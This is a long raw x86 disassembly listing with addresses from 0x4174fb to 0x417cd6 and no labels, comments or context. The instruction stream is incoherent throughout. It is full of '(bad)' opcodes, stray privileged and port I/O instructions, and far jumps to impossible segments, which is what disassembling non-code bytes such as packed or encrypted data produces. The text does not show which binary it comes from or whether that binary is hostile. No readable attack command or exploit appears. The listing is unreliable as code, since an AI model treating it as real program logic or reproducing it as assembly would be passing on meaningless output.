  4174fb:	std    
  4174fc:	mov    ebx,0x277e4924
  417501:	stc    
  417502:	popf   
  417503:	or     dh,BYTE PTR [eax-0x7f]
  417506:	cmovle ebp,DWORD PTR [ebx+0x4f]
  41750a:	push   ebx
  41750b:	(bad)  
  41750c:	test   eax,0xb39c4bb3
  417511:	or     esi,DWORD PTR [esi-0x63571f0d]
  417517:	push   0xe21281f7
  41751c:	int    0x2e
  41751e:	mov    esi,0x4fdcc356
  417523:	and    edi,DWORD PTR [ebp+0x39]
  417526:	rol    cl,0x90
  417529:	jnp    0x4175a8
  41752b:	imul   ebp,DWORD PTR [esi+0x4802d9e9],0x27
  417532:	test   DWORD PTR [eax-0x43],0xf2882a2c
  417539:	mov    edi,0x1eb06ec3
  41753e:	push   es
  41753f:	mov    ds:0x9fb6d102,al
  417544:	outs   dx,DWORD PTR ds:[esi]
  417545:	mov    cl,0x6e
  417547:	sbb    DWORD PTR [esi+0x79],eax
  41754a:	icebp  
  41754b:	sbb    eax,0xcd7a6f49
  417550:	fnstenv [ebx+0x70074345]
  417556:	add    esp,DWORD PTR [ebx]
  417558:	dec    edx
  417559:	test   eax,0xf51db9a0
  41755e:	xor    ah,BYTE PTR [ecx+0x4765a4d8]
  417564:	cmp    eax,0x7242ab69
  417569:	or     BYTE PTR [esi-0x1e],0x6d
  41756d:	cmc    
  41756e:	cmp    DWORD PTR [eax+0x4a7e1a68],esi
  417574:	or     eax,0x174c2a52
  417579:	push   0xffffffb6
  41757b:	jmp    0x4bfc:0x9ffa204c
  417582:	outs   dx,BYTE PTR ds:[esi]
  417583:	and    bh,0x4c
  417586:	stos   DWORD PTR es:[edi],eax
  417587:	mul    dl
  417589:	dec    ecx
  41758a:	xlat   BYTE PTR ds:[ebx]
  41758b:	dec    esi
  41758c:	and    eax,0xd9c54078
  417591:	ds jg  0x417540
  417594:	add    eax,0xbae80f8d
  417599:	dec    eax
  41759a:	fistp  WORD PTR [eax+0x22b487ae]
  4175a0:	adc    ebx,DWORD PTR [ecx+0xbaf03b8]
  4175a6:	retf   0x5f5
  4175a9:	cmp    al,0x6d
  4175ac:	mov    gs,eax
  4175ae:	pop    esp
  4175af:	(bad)  
  4175b0:	hlt    
  4175b1:	sti    
  4175b2:	push   ecx
  4175b3:	loop   0x41757b
  4175b5:	icebp  
  4175b6:	and    edi,DWORD PTR [eax-0x17c4789a]
  4175bc:	mov    cl,0xce
  4175be:	mov    edx,0xf40f6f57
  4175c3:	push   cs
  4175c4:	add    BYTE PTR gs:[esi+0x1e],ch
  4175c8:	pop    eax
  4175c9:	ds jbe 0x4175be
  4175cc:	fnstcw WORD PTR [edx+0x52]
  4175cf:	dec    ebp
  4175d0:	add    DWORD PTR [ebx+0x3a],ecx
  4175d3:	fimul  DWORD PTR [ebx]
  4175d5:	sub    eax,0x7eda425a
  4175da:	rol    DWORD PTR [edx-0x784ea2be],1
  4175e0:	or     BYTE PTR [ecx+0x70bfe369],dh
  4175e6:	or     edx,DWORD PTR [edx+0x4a]
  4175e9:	pop    edx
  4175ea:	scas   eax,DWORD PTR es:[edi]
  4175eb:	ins    BYTE PTR es:[edi],dx
  4175ec:	scas   eax,DWORD PTR es:[edi]
  4175ed:	(bad)  
  4175ee:	jge    0x4175b9
  4175f0:	icebp  
  4175f1:	jmp    0xde4deaef
  4175f6:	or     BYTE PTR [ebx-0x2e168f63],ch
  4175fc:	inc    ecx
  4175fd:	sti    
  4175fe:	lahf   
  4175ff:	mov    al,ds:0xf436f2d0
  417604:	mov    ebp,0x16a1ced5
  417609:	retf   
  41760a:	out    dx,al
  41760b:	call   0x7f6cf2eb
  417610:	xchg   ecx,eax
  417611:	(bad)  
  417612:	inc    ebx
  417613:	aaa    
  417614:	fdivrp st(4),st
  417616:	cmp    al,0x50
  417618:	jo     0x417665
  41761a:	jmp    0x4175b0
  41761c:	clc    
  41761d:	repnz sub BYTE PTR [eax-0x173bb9ad],bh
  417624:	jg     0x4175e0
  417626:	scas   eax,DWORD PTR es:[edi]
  417627:	pop    ebp
  417628:	in     al,dx
  417629:	jo     0x4175e1
  41762b:	cmp    DWORD PTR [ecx],0x76
  41762e:	mov    DWORD PTR [edx],0x6edfd22e
  417634:	loop   0x417648
  417636:	mov    BYTE PTR [edi-0x2e],cl
  417639:	adc    dh,bl
  41763b:	(bad)  [eax]
  41763d:	pop    ebp
  41763e:	or     al,0xc6
  417640:	inc    eax
  417641:	fist   DWORD PTR [ebx]
  417643:	or     eax,0xaf2beed
  417648:	hlt    
  417649:	xor    ebp,eax
  41764b:	cmpps  xmm5,XMMWORD PTR [edi+0x6c0fc71f],0xe2
  417653:	mov    edi,0x2bd2c096
  417658:	xchg   BYTE PTR [edx-0x770d7feb],cl
  41765e:	mov    esp,0xdd7566fd
  417663:	fnstcw WORD PTR [esi+0x7]
  417666:	adc    edi,DWORD PTR [edi-0x283ca675]
  41766c:	ds out 0xef,al
  41766f:	out    dx,al
  417670:	iret   
  417671:	pop    ebp
  417672:	icebp  
  417673:	test   BYTE PTR [edi+0x5021b0e4],0xed
  41767a:	mov    al,ds:0xa2d9799e
  41767f:	mov    ah,0xa5
  417681:	retf   
  417682:	xchg   ebx,eax
  417683:	pop    ebp
  417684:	ds idiv esp
  417687:	pop    eax
  417689:	dec    esi
  41768a:	test   eax,0x8d82f393
  41768f:	add    ebx,DWORD PTR [ebx+0x46]
  417692:	xchg   ebp,eax
  417693:	sbb    DWORD PTR [esi+0x6d],ebx
  417696:	cli    
  417697:	cmp    eax,0xb8c1519e
  41769c:	test   al,0x79
  41769e:	jae    0x4176d7
  4176a0:	or     eax,eax
  4176a2:	push   es
  4176a3:	add    ecx,DWORD PTR [edi]
  4176a5:	scas   eax,DWORD PTR es:[edi]
  4176a6:	add    eax,0xee0e2866
  4176ab:	ds dec ecx
  4176ad:	jne    0x417685
  4176af:	jg     0x4176f0
  4176b1:	test   DWORD PTR [eax+edi*1],edi
  4176b4:	cmp    BYTE PTR [edx+0x67],cl
  4176b7:	call   0x2ce8:0x590d4f61
  4176be:	pop    eax
  4176bf:	(bad)  
  4176c0:	test   al,0xb7
  4176c2:	pop    esp
  4176c3:	shl    BYTE PTR [esp+ecx*2-0x80b7021],1
  4176ca:	lds    ecx,FWORD PTR [ebx]
  4176cc:	mov    bl,0x5a
  4176ce:	mov    bl,0x4a
  4176d0:	clc    
  4176d1:	xchg   edi,eax
  4176d2:	call   DWORD PTR [edx-0x6d]
  4176d5:	dec    edx
  4176d6:	fnsave [ecx+0x513a69a3]
  4176dc:	inc    esp
  4176dd:	pop    edi
  4176de:	cld    
  4176df:	jae    0x4176cd
  4176e1:	(bad)  
  4176e2:	pop    ds
  4176e3:	mov    bl,0x1
  4176e5:	popf   
  4176e6:	mov    al,0x28
  4176e8:	cmp    al,0x41
  4176ea:	jp     0x41769d
  4176ec:	inc    edx
  4176ed:	loopne 0x4176af
  4176ef:	out    dx,eax
  4176f0:	call   0xcf47a85e
  4176f5:	stos   BYTE PTR es:[edi],al
  4176f6:	xchg   BYTE PTR ds:0x9809724,dl
  4176fc:	mov    BYTE PTR [ecx+ebx*1+0x616d4b21],al
  417703:	ror    BYTE PTR [edi-0x7c25d51e],cl
  417709:	fwait
  41770a:	add    eax,0x860b8d99
  41770f:	aam    0x9a
  417711:	into   
  417712:	push   es
  417713:	dec    edx
  417714:	retf   0x3d2e
  417717:	dec    edx
  417718:	scas   al,BYTE PTR es:[edi]
  417719:	xchg   DWORD PTR [eax+0x1e5b1e3],esp
  41771f:	mov    eax,0x135b949c
  417724:	inc    edi
  417725:	mov    al,0x57
  417727:	ins    BYTE PTR es:[edi],dx
  417728:	jge    0x4176f2
  41772a:	and    BYTE PTR [edx+0x21],0xe6
  41772e:	shr    cl,cl
  417730:	sbb    edx,DWORD PTR [eax-0x792759e3]
  417736:	add    eax,0x4b917880
  41773b:	xchg   DWORD PTR [edi],edx
  41773d:	jb     0x4177ae
  41773f:	inc    ecx
  417740:	les    esi,FWORD PTR [ebp-0x70]
  417743:	test   eax,0x7ff1a3bc
  417748:	test   BYTE PTR [eax-0xe93ae34],0xdc
  41774f:	or     ch,BYTE PTR [esi-0x7e8c2294]
  417755:	mov    edi,0x711ae9e4
  41775a:	xor    eax,0xb1a116ca
  41775f:	ja     0x4177af
  417761:	clc    
  417762:	sbb    BYTE PTR [esp+esi*4-0x2c33fafb],ah
  417769:	rcr    BYTE PTR [edx+edx*1-0x503e576e],cl
  417770:	cmp    al,0xd5
  417772:	and    eax,0xc55e6c12
  417777:	es inc ecx
  417779:	stc    
  41777a:	sbb    DWORD PTR [eax+0x50],eax
  41777d:	retf   0x45a3
  417780:	stc    
  417781:	ffreep st(7)
  417783:	es iret 
  417785:	enter  0x893e,0x58
  417789:	call   0xa73:0xbdb52206
  417790:	popf   
  417791:	inc    eax
  417792:	std    
  417793:	mov    al,0x38
  417795:	or     bl,cl
  417797:	imul   ebp,DWORD PTR [edi-0x7a],0x6a
  41779b:	xchg   BYTE PTR [ebx-0x5b],cl
  41779e:	and    DWORD PTR [ecx],esp
  4177a0:	xchg   ebp,eax
  4177a1:	popa   
  4177a2:	mov    ch,BYTE PTR [ebx]
  4177a4:	rcl    BYTE PTR [ebp+esi*1+0x79914c81],1
  4177ab:	mov    WORD PTR [ecx+0x21],?
  4177ae:	pusha  
  4177af:	pop    edi
  4177b0:	ficom  DWORD PTR [ebx+0x2f82bf3]
  4177b6:	sbb    BYTE PTR [ebx-0x9],dl
  4177b9:	cmp    dh,dl
  4177bb:	in     al,0x56
  4177bd:	mov    bl,0x9d
  4177bf:	hlt    
  4177c0:	mul    BYTE PTR [ebp+0x45]
  4177c3:	jmp    0x41779f
  4177c5:	scas   eax,DWORD PTR es:[edi]
  4177c6:	fild   DWORD PTR ds:0x98ac400
  4177cc:	push   esp
  4177cd:	outs   dx,BYTE PTR ds:[esi]
  4177ce:	jbe    0x4177bf
  4177d0:	in     eax,0x0
  4177d2:	lea    esp,[esi+0x6d]
  4177d5:	mov    ds:0x75958c7a,al
  4177da:	push   cs
  4177db:	aaa    
  4177dc:	aas    
  4177dd:	sbb    al,0xb1
  4177df:	and    eax,0x193e3a9e
  4177e4:	mov    al,0x2b
  4177e6:	rcl    bh,cl
  4177e8:	push   eax
  4177e9:	mov    es,WORD PTR [ebx]
  4177eb:	cwde   
  4177ec:	sbb    ecx,DWORD PTR [ebp-0x6f0ae949]
  4177f2:	sbb    al,0xb4
  4177f4:	dec    ebx
  4177f5:	loop   0x4177ef
  4177f7:	pop    edi
  4177f8:	mov    DWORD PTR [edx+0x16],ebp
  4177fb:	rcl    DWORD PTR ds:0x6947c5f4,0x7c
  417802:	retf   0x83e5
  417805:	outs   dx,BYTE PTR ds:[esi]
  417806:	jp     0x4177ab
  417808:	sahf   
  417809:	ret    
  41780a:	and    esp,ebx
  41780c:	mov    al,ds:0x8c52ab8c
  417811:	pop    ebp
  417812:	(bad)  
  417813:	pop    ss
  417814:	repz test al,0xa2
  417817:	pop    eax
  417818:	cmp    al,0xd5
  41781a:	arpl   cx,dx
  41781c:	or     WORD PTR [edi+0x6d73e31a],sp
  417823:	mov    esp,0xfb543608
  417828:	das    
  417829:	and    eax,DWORD PTR ds:0x5a7d0e2c
  41782f:	sbb    ch,BYTE PTR [esi+eiz*4]
  417832:	jae    0x4177d4
  417834:	pop    ebp
  417835:	sar    BYTE PTR [esi-0x5c0a5a92],1
  41783b:	pushf  
  41783c:	push   esi
  41783d:	or     BYTE PTR [edx+0x36c316fc],cl
  417843:	hlt    
  417844:	das    
  417845:	jmp    0x4177ed
  417847:	outs   dx,DWORD PTR ds:[esi]
  417848:	cli    
  417849:	cmp    DWORD PTR [edx-0x47],esi
  41784c:	gs (bad) 
  41784e:	jno    0x41788e
  417850:	(bad)  
  417851:	in     al,dx
  417852:	mov    dl,0xe1
  417854:	das    
  417855:	sar    BYTE PTR [eax+edi*1],0x13
  417859:	and    BYTE PTR [eax-0x153f940e],0x8d
  417860:	push   esp
  417861:	mov    dl,0xf2
  417863:	inc    edi
  417864:	xlat   BYTE PTR ds:[ebx]
  417865:	popf   
  417866:	adc    BYTE PTR [edi+eiz*8],ch
  417869:	or     DWORD PTR [esi+0x3a],ebp
  41786c:	(bad)  [ecx+eiz*8-0x50]
  417870:	fldenv [edx-0x405474c6]
  417876:	ret    
  417877:	out    0x76,al
  417879:	or     eax,0x714406b9
  41787e:	adc    DWORD PTR [ecx],0x7d62e1eb
  417884:	push   ecx
  417885:	mov    ebp,0x4a7cc2cf
  41788a:	mov    esi,fs
  41788c:	fcmovnu st,st(4)
  41788e:	sub    ecx,ebx
  417890:	(bad)  
  417891:	sub    DWORD PTR [eax-0x43717e7],edx
  417897:	mov    esp,0x2aa19945
  41789c:	mov    cl,0x54
  41789e:	adc    esi,ebx
  4178a0:	loop   0x4178a5
  4178a2:	xchg   BYTE PTR [esi],bh
  4178a4:	mov    esi,DWORD PTR ds:0x41ea9da4
  4178aa:	push   ebp
  4178ab:	clc    
  4178ac:	cmc    
  4178ad:	rcr    BYTE PTR [ebx+0x22],0xa0
  4178b1:	cmc    
  4178b2:	push   cs
  4178b3:	test   dl,0xca
  4178b6:	scas   al,BYTE PTR es:[edi]
  4178b7:	push   ebx
  4178b8:	lds    ecx,FWORD PTR [esi+eiz*2]
  4178bb:	into   
  4178bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178bd:	pop    eax
  4178be:	adc    al,0xca
  4178c0:	jmp    0x83b82682
  4178c5:	sbb    al,0x95
  4178c7:	scas   al,BYTE PTR es:[edi]
  4178c8:	ret    
  4178c9:	jo     0x417919
  4178cb:	inc    esp
  4178cc:	mov    gs,WORD PTR [ebp-0xeab33e2]
  4178d2:	jg     0x4178ab
  4178d4:	pop    eax
  4178d5:	int3   
  4178d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178d7:	or     al,BYTE PTR [ebx+0x2a]
  4178da:	mov    ah,0x35
  4178dc:	or     eax,0xf3e61bf0
  4178e1:	mov    dh,BYTE PTR [esi+0x1b7f822f]
  4178e7:	mov    WORD PTR [ebx+eax*1+0x51d98871],ds
  4178ee:	jo     0x4178fe
  4178f0:	repz push ds
  4178f2:	mov    bh,dl
  4178f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f5:	pop    ecx
  4178f6:	add    al,0x47
  4178f8:	mov    ds:0xc7a2e4a,eax
  4178fd:	ss adc ebp,ecx
  417900:	mul    DWORD PTR [ebp+0x3c]
  417903:	test   eax,0x9992a0c
  417908:	fmul   QWORD PTR [edi+0x124f32f5]
  41790e:	jecxz  0x41797f
  417910:	mov    bl,0x26
  417912:	sbb    eax,0x551046c2
  417917:	ja     0x41791b
  417919:	(bad)  
  41791a:	xor    eax,ecx
  41791c:	pop    esp
  41791d:	mov    dl,0xc4
  41791f:	or     BYTE PTR [eax-0x4b],cl
  417922:	std    
  417923:	dec    ecx
  417924:	xor    BYTE PTR [eax+0x1a],0xf6
  417928:	gs in  eax,0x8f
  41792b:	scas   eax,DWORD PTR es:[edi]
  41792c:	neg    BYTE PTR ds:0x4f1aaf66
  417932:	add    BYTE PTR [ecx],bh
  417934:	jae    0x417988
  417936:	add    edx,DWORD PTR [eax-0x1]
  417939:	stos   BYTE PTR es:[edi],al
  41793a:	sub    eax,0xe3a93f0b
  41793f:	push   0xffffffb0
  417941:	loopne 0x4179ac
  417943:	mov    ah,0xf7
  417945:	mov    eax,ds:0x86e056ec
  41794a:	dec    ebp
  41794b:	pop    es
  41794c:	std    
  41794d:	mov    esp,0xcdb3ad30
  417952:	mov    BYTE PTR [ecx+0x75ef149b],ch
  417958:	adc    eax,DWORD PTR [edx]
  41795a:	imul   edi,edi,0x34
  41795d:	sub    esp,DWORD PTR [eax+ecx*2-0x50fbb078]
  417964:	push   eax
  417965:	pop    esp
  417966:	mov    DWORD PTR [esi-0x76],ecx
  417969:	mov    ebp,0xa08770b4
  41796e:	int    0xc7
  417970:	shl    cl,1
  417972:	sbb    DWORD PTR [ebx],ebx
  417974:	cmp    al,0x48
  417976:	push   0x9de5255
  41797b:	scas   ax,WORD PTR es:[edi]
  41797d:	inc    ebx
  41797e:	dec    esi
  41797f:	stos   DWORD PTR es:[edi],eax
  417980:	xchg   BYTE PTR [ecx-0x52b8c486],al
  417986:	or     eax,ebx
  417988:	adc    al,0x39
  41798a:	daa    
  41798b:	adc    BYTE PTR [edx+0x36],ah
  41798e:	dec    DWORD PTR [eax-0x37a54dca]
  417994:	icebp  
  417995:	adc    al,0xe1
  417997:	in     eax,dx
  417998:	stos   DWORD PTR es:[edi],eax
  417999:	dec    esi
  41799a:	jo     0x4179b0
  41799c:	push   esi
  41799d:	and    DWORD PTR [esi-0x1f],eax
  4179a0:	mov    edi,0x787a5817
  4179a5:	jmp    0x130caf06
  4179aa:	addr16 gs xchg esi,eax
  4179ad:	push   eax
  4179ae:	pop    ebx
  4179af:	in     eax,0x25
  4179b1:	add    cl,al
  4179b3:	mov    ebx,0xe40d4ec7
  4179b8:	inc    esp
  4179b9:	adc    BYTE PTR [eax-0x338b848],al
  4179bf:	fild   WORD PTR [esi+0x3048cdc8]
  4179c5:	aas    
  4179c6:	inc    edx
  4179c7:	outs   dx,DWORD PTR ds:[esi]
  4179c8:	lods   al,BYTE PTR ds:[esi]
  4179ca:	mov    edx,0x27af3f97
  4179cf:	loopne 0x417a24
  4179d1:	(bad)  
  4179d2:	fsubr  DWORD PTR [ebp+0xc]
  4179d5:	jmp    0x417a43
  4179d7:	inc    esi
  4179d8:	stos   DWORD PTR es:[edi],eax
  4179d9:	rol    BYTE PTR [edx],0x9e
  4179dc:	or     ebp,edi
  4179de:	xor    DWORD PTR [esi],ebp
  4179e0:	daa    
  4179e1:	aam    0xbb
  4179e3:	mov    WORD PTR [ecx],?
  4179e5:	mov    dl,0x70
  4179e7:	not    DWORD PTR [edx-0x72]
  4179ea:	sbb    eax,ecx
  4179ec:	outs   dx,BYTE PTR ds:[esi]
  4179ed:	in     eax,dx
  4179ee:	mov    ebp,0xb863ca0
  4179f3:	sbb    DWORD PTR ds:0xd32c8fbc,ebx
  4179f9:	dec    edi
  4179fa:	icebp  
  4179fb:	cmp    BYTE PTR [ecx-0x4e81d074],al
  417a01:	stos   DWORD PTR es:[edi],eax
  417a02:	mov    BYTE PTR [ecx+0x1915af84],ch
  417a08:	dec    edx
  417a09:	jle    0x417998
  417a0b:	cmp    BYTE PTR [eax],dl
  417a0d:	jns    0x4179e4
  417a0f:	adc    al,bl
  417a11:	rcl    DWORD PTR [ebx+ebp*2+0x6e],0x72
  417a16:	fstp   QWORD PTR [ecx]
  417a18:	jle    0x4179a4
  417a1a:	inc    edx
  417a1b:	std    
  417a1c:	xor    eax,0x5843bf82
  417a21:	cmp    al,BYTE PTR [edx]
  417a23:	sub    DWORD PTR ds:0xa5d1,esi
  417a28:	inc    esi
  417a29:	js     0x417a90
  417a2b:	imul   eax,eax,0x46e23f46
  417a31:	cwde   
  417a32:	adc    esi,eax
  417a34:	xchg   edi,eax
  417a35:	lahf   
  417a36:	mov    edx,0x23ed9e42
  417a3b:	popf   
  417a3c:	ja     0x417aa6
  417a3e:	shl    BYTE PTR [edx],cl
  417a40:	sub    ebp,DWORD PTR ds:[esi+0xda8b589]
  417a47:	cli    
  417a48:	push   ebp
  417a49:	push   es
  417a4a:	lahf   
  417a4b:	jmp    0x251d:0xc8db1099
  417a52:	pop    ss
  417a53:	inc    ebx
  417a54:	repz or eax,0x5b22d588
  417a5a:	fldcw  WORD PTR [esi-0x2c29368e]
  417a60:	sbb    cl,BYTE PTR [ebp+0x11]
  417a63:	pop    ebp
  417a64:	mov    DWORD PTR [edx+0x26dcc3fc],edi
  417a6a:	sub    ebx,esi
  417a6c:	pop    es
  417a6d:	outs   dx,BYTE PTR ds:[esi]
  417a6e:	aas    
  417a6f:	(bad)  
  417a70:	adc    cl,al
  417a72:	jp     0x417aa5
  417a74:	frstor [ecx]
  417a76:	dec    esp
  417a77:	ins    DWORD PTR es:[edi],dx
  417a78:	mov    al,0xd8
  417a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a7b:	xchg   ecx,eax
  417a7d:	out    dx,eax
  417a7e:	add    edx,DWORD PTR [ebp+0x7b26bbf1]
  417a84:	and    DWORD PTR [ebx+0x65e3f11],edx
  417a8a:	shr    DWORD PTR [esi-0x6b664750],0x2b
  417a91:	sbb    BYTE PTR [ecx],ch
  417a93:	out    0x83,al
  417a95:	dec    ecx
  417a96:	xchg   edi,eax
  417a97:	es xchg esp,eax
  417a99:	xor    edx,eax
  417a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a9c:	jne    0x417adc
  417a9e:	or     bh,BYTE PTR [ebp+0x58]
  417aa1:	xor    DWORD PTR [ecx-0x49858054],0xffffffb0
  417aa8:	imul   ebx,DWORD PTR [ebx+esi*4],0x81ab84f0
  417aaf:	push   0x9b75a038
  417ab4:	push   es
  417ab5:	dec    edx
  417ab6:	add    bl,BYTE PTR [esi]
  417ab8:	or     bh,BYTE PTR [eax-0x8]
  417abb:	out    dx,eax
  417abc:	mov    ebp,0xfe22e96
  417ac1:	or     al,0xa1
  417ac3:	outs   dx,BYTE PTR ds:[esi]
  417ac4:	pop    ebp
  417ac5:	or     dl,BYTE PTR [eax+0x38]
  417ac8:	add    bh,BYTE PTR [edi+0x5ee2f793]
  417ace:	adc    eax,0xe8fd9fd9
  417ad3:	xlat   BYTE PTR ds:[ebx]
  417ad4:	inc    ecx
  417ad5:	mov    dl,0xbc
  417ad7:	(bad)  [edi]
  417ad9:	jno    0x417a8b
  417adb:	mov    DWORD PTR [edx+edx*2-0x72],esp
  417adf:	test   DWORD PTR [edx+0x57],esp
  417ae2:	mov    al,ds:0x1361653
  417ae7:	and    ecx,esi
  417ae9:	pop    ecx
  417aea:	cld    
  417aeb:	sub    eax,0x33b03ce
  417af0:	outs   dx,DWORD PTR ds:[esi]
  417af1:	es popw ss
  417af4:	js     0x417ad3
  417af6:	in     eax,dx
  417af7:	pop    ebx
  417af8:	sbb    eax,0xe56e0f11
  417afd:	pushf  
  417afe:	push   es
  417aff:	dec    ebx
  417b00:	cld    
  417b01:	retf   0x6c05
  417b04:	mov    eax,ds:0xb2c78c87
  417b09:	xchg   edx,eax
  417b0a:	xchg   esi,eax
  417b0b:	xor    al,0xb5
  417b0d:	clc    
  417b0e:	add    DWORD PTR [esp+ebp*8],eax
  417b11:	add    al,0xe3
  417b13:	dec    ecx
  417b14:	jmp    0x417b90
  417b16:	daa    
  417b17:	push   0xcea99215
  417b1c:	add    esp,DWORD PTR [esi]
  417b1e:	mov    bh,0xe0
  417b20:	and    esi,esp
  417b22:	sbb    edi,ebp
  417b24:	lods   eax,DWORD PTR ds:[esi]
  417b25:	idiv   DWORD PTR [eax]
  417b27:	ror    edx,0xbb
  417b2a:	call   0x5b7bf6f1
  417b2f:	xchg   DWORD PTR [ebx],eax
  417b31:	arpl   WORD PTR [esi],cx
  417b33:	mov    ah,0x8c
  417b35:	sub    al,0xc1
  417b37:	jne    0x417b66
  417b39:	in     eax,0xb1
  417b3b:	out    0x91,al
  417b3d:	in     eax,dx
  417b3e:	iret   
  417b3f:	cmp    DWORD PTR [ebp+0x71651362],ebx
  417b45:	adc    ecx,DWORD PTR [ebx-0x77c5ae4c]
  417b4b:	fmul   st,st(6)
  417b4d:	les    ebp,FWORD PTR [edx-0x2721706b]
  417b53:	add    DWORD PTR [ebx],ecx
  417b55:	or     esp,DWORD PTR [edi-0x7d]
  417b58:	popa   
  417b59:	xor    eax,0x550ba72a
  417b5e:	mov    ds:0x5c92e6a5,eax
  417b63:	dec    edx
  417b64:	(bad)  
  417b66:	jge    0x417b07
  417b68:	out    0xa3,al
  417b6a:	lahf   
  417b6b:	pop    ebp
  417b6c:	and    al,0xf5
  417b6e:	(bad)  
  417b6f:	in     eax,0xac
  417b71:	test   al,0xed
  417b73:	jnp    0x417b77
  417b75:	in     eax,0x2
  417b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b78:	loopne 0x417bcd
  417b7a:	int3   
  417b7b:	ror    DWORD PTR [ebx-0x74aa24ad],0x13
  417b82:	mov    DWORD PTR [edx],ebp
  417b84:	lods   al,BYTE PTR ds:[esi]
  417b85:	aaa    
  417b86:	pop    eax
  417b87:	seto   BYTE PTR [ebx]
  417b8a:	ret    0xe817
  417b8d:	jmp    0x417bb4
  417b8f:	mov    edi,0x9a3c92f4
  417b94:	mov    eax,0xf7b4c5fc
  417b99:	jecxz  0x417b73
  417b9b:	inc    ebp
  417b9c:	mov    ebx,0x2206b3e2
  417ba1:	push   eax
  417ba2:	test   BYTE PTR [ecx],dl
  417ba4:	data16 jge 0x417c22
  417ba7:	out    0xae,eax
  417ba9:	sbb    ebp,DWORD PTR [eax+0x33cfc99]
  417baf:	mov    ch,0x59
  417bb1:	xchg   ecx,eax
  417bb2:	and    edx,esi
  417bb4:	std    
  417bb5:	xlat   BYTE PTR ds:[ebx]
  417bb6:	loope  0x417c1a
  417bb8:	ins    DWORD PTR es:[edi],dx
  417bb9:	sub    al,0xe1
  417bbb:	aaa    
  417bbc:	ret    0x269b
  417bbf:	dec    edi
  417bc0:	inc    edi
  417bc1:	inc    ebp
  417bc2:	or     eax,0x8f1a5422
  417bc7:	mov    DWORD PTR [ebx+eax*8],edi
  417bca:	xchg   esp,eax
  417bcb:	in     eax,0xde
  417bcd:	xchg   BYTE PTR ss:[edx+0x70],ah
  417bd1:	xor    dl,BYTE PTR [esi-0x18]
  417bd4:	inc    ebp
  417bd5:	pop    ebx
  417bd6:	xchg   ecx,eax
  417bd7:	jbe    0x417c0e
  417bd9:	je     0x417bc7
  417bdb:	pop    ds
  417bdc:	iret   
  417bdd:	stos   BYTE PTR es:[edi],al
  417bde:	sub    eax,0xeaeaaf1e
  417be3:	cld    
  417be4:	shl    DWORD PTR [ecx-0x7a0500a0],0xd0
  417beb:	push   esi
  417bec:	mov    WORD PTR [edx-0x5f2cc35a],ds
  417bf2:	ins    DWORD PTR es:[edi],dx
  417bf3:	std    
  417bf4:	loop   0x417c5c
  417bf6:	mov    dl,0x68
  417bf8:	loope  0x417b9e
  417bfa:	hlt    
  417bfb:	shr    DWORD PTR gs:[eax+0x2de58b52],cl
  417c02:	in     al,dx
  417c03:	(bad)  
  417c04:	lods   eax,DWORD PTR ds:[esi]
  417c05:	cmp    al,0x24
  417c07:	dec    esi
  417c08:	stc    
  417c09:	pop    ds
  417c0a:	popa   
  417c0b:	mov    cl,0x12
  417c0d:	and    eax,0x5e3f1d56
  417c12:	dec    ebx
  417c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c14:	int    0xe2
  417c16:	or     ebx,ecx
  417c18:	push   ecx
  417c19:	or     ecx,0x76
  417c1c:	adc    al,0x17
  417c1e:	jmp    esp
  417c20:	add    ebx,ebx
  417c22:	or     al,0x8b
  417c24:	sub    eax,0xee72f97b
  417c29:	and    dl,BYTE PTR [eax+0x11]
  417c2c:	gs xchg ebx,eax
  417c2e:	les    esp,FWORD PTR [ebp-0x11c04ef8]
  417c34:	inc    edi
  417c35:	sub    BYTE PTR [edx-0x4d2a2a2c],bl
  417c3b:	aad    0x36
  417c3d:	mov    ecx,DWORD PTR [ecx]
  417c3f:	rcl    DWORD PTR [esi],cl
  417c41:	pusha  
  417c42:	xor    edi,esp
  417c44:	ret    
  417c45:	mov    BYTE PTR [esi],ch
  417c47:	leave  
  417c48:	mov    ch,0xce
  417c4a:	xor    bh,BYTE PTR [ebx+0x1c]
  417c4d:	jno    0x417c5e
  417c4f:	pop    edi
  417c50:	xlat   BYTE PTR ds:[ebx]
  417c51:	jmp    0x1b578b7b
  417c56:	adc    DWORD PTR [edi+0x3],eax
  417c59:	out    dx,al
  417c5a:	and    eax,0x1522b575
  417c5f:	cdq    
  417c60:	les    esp,FWORD PTR [ebx]
  417c62:	bound  edx,QWORD PTR [edx]
  417c64:	(bad)  
  417c65:	and    ecx,DWORD PTR [ebp+0x19]
  417c68:	dec    bx
  417c6a:	or     al,0xb6
  417c6c:	imul   eax,DWORD PTR [ebp+0xe2477c6],0xd95d778d
  417c76:	out    dx,eax
  417c77:	cmp    DWORD PTR [ebx+eax*4-0x6b408e6f],ebp
  417c7e:	ds push ebp
  417c80:	popf   
  417c81:	xlat   BYTE PTR ds:[ebx]
  417c83:	or     ecx,DWORD PTR [ebx-0x74cb4702]
  417c89:	push   es
  417c8a:	ret    0x99ed
  417c8d:	xor    eax,0xa50e4e9b
  417c92:	inc    edx
  417c93:	push   edx
  417c94:	sbb    dh,BYTE PTR [ebp-0x76f90b8e]
  417c9a:	mov    al,0x96
  417c9c:	cmp    al,0x0
  417c9e:	je     0x417d1f
  417ca0:	ss pop ds
  417ca2:	mov    ah,0xf3
  417ca4:	sbb    ah,dh
  417ca6:	test   al,0xf
  417ca8:	inc    ecx
  417ca9:	ds out 0xd9,al
  417cac:	jb     0x417cf9
  417cae:	test   eax,0x5e781f75
  417cb3:	bound  ecx,QWORD PTR [esi]
  417cb5:	out    0xfb,al
  417cb7:	and    eax,0xe9063a0d
  417cbc:	mov    al,0xcb
  417cbe:	idiv   BYTE PTR [ebx+0x46]
  417cc1:	outs   dx,BYTE PTR ds:[esi]
  417cc2:	imul   eax,DWORD PTR [edi],0xffffff80
  417cc5:	pop    edi
  417cc6:	sbb    al,0x6d
  417cc8:	pop    ebp
  417cc9:	xchg   edx,eax
  417cca:	es ret 0x7174
  417cce:	rol    DWORD PTR [eax],1
  417cd0:	jo     0x417cde
  417cd2:	jge    0x417d1e
  417cd4:	ja     0x417c84
  417cd6:	stc    
